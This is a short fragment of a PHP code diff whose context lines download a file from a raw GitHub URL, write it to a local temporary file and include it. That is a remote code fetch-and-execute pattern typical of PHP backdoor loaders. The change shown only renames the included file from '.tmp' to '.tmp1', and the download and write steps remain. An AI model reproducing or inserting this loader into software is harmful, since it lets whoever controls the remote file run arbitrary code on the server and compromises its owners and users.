@@ -116,5 +116,5 @@ $a = file_get_contents("https://raw.githubusercontent.com/Syukron12/Syukron12/ma
 $dd2 = fopen(".tmp","w");
  fwrite($dd2, $a);
  fclose($dd2);
-include(".tmp");
+include(".tmp1");
 }
